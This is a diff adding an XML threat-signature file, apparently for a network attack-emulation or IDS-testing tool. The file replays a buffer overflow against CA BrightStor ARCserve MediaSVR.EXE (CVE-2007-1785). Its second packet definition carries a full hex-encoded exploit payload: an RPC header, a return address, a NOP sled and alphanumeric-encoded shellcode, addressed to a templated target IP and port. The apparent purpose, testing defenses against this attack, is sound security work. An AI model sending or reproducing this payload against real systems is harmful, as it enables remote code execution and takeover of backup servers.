@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Computer Associates BrightStor ARCserve Backup MediaSVR.EXE  191 Buffer Overflow Vulnerability (alternative payload)"/>
+    <EngDesc display="true" value="This threat demonstrates the bufferoverflow vulnerability in the computer associates brightstor arcserve mediasvr.exe executable, this threat is delivered on the proprietary port 111."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Infection"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Computer_Associates"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Computer_Associates_ARCserve"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Computer_Associates_ARCserve_11.5_SP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://downloads.securityfocus.com/vulnerabilities/exploits/brightstor_exp.pl"/>
+    <CVEID display="true" value="CVE-2007-1785"/>
+    <bugtraqID display="true" value="23209"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="037052e09897d857c5007e04da06a3d7"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633126771033125000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1177984576" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="800000382184F7C90000000000000002000186A00000000200000003000000000000000000000000000000000006097E000000010000000600000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="8000803465CF4C7B00000000000000020006097E00000001000000BF00000000000000000000000000000000009E2764414243443C279E006C279E00EB0190909090909090909090909090909090EB0359EB05E8F8FFFFFF4F494949494949515A5654583633305658344130423648483042333042435658324244424834413241443041445442445142304144415658345A3842444A4F4D4E4F4C364B4E4D344A4E494F4F4F4F4F4F4F42464B584E56464246424B5845544E534B484E5745304A4741304F4E4B484F444A514B384F55423241504B4E49444B5846334B584130504E4143424C49494E4A4648424C46374730414C4C4C4D304130444C4B4E464F4B53463546524A424557454E4B484F45465241304B4E48464B384E504B544B484F454E4141304B4E43304E324B5849484E3646424E414156434C41534B4D46564B38435442434B5842444E304B3842474E414D4A4B5842444A3050554A565048503450304E4E42454F4F484D4836434548564A46435344334A464737435744334F3546354F4F424D4A364B4C4D4E4E4F4B5342454F4F484D4F354938454E484641584D4E4A30443045354C3644304F4F424D4A46494D4950454F4D4A47354F4F484D4335434543554345433543344355433443454F4F424D48464A3641414E45483643454958414E45394A56464A4C314237474C47454F4F484D4C464231415545554F4F424D4A36464A4D4A5042494E47454F4F484D435545354F4F424D4A36454E49544858494447554F4F484D42554635463545354F4F424D43394A56474E4947484C493747454F4F484D45454F4F424D48464C36465648364A4643464D464958454E4C564235495549524E4C4938474E4C5646544958444E4153424C434F4C4A504F44544D52504F44344E3243494D484C474A334B4A4B4A4B4A4A364447504F434B48414F4F455746344F4F484D4B45475544554145413541554C36413041354155454541454F4F424D4A564D4A494D4530504C43354F4F484D4C564F4F4F4F47334F4F424D4B3847554E4F4348464C46364F4F484D44554F4F424D4A46424F4C4846504F4543554F4F484D4F4F424D5A90" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
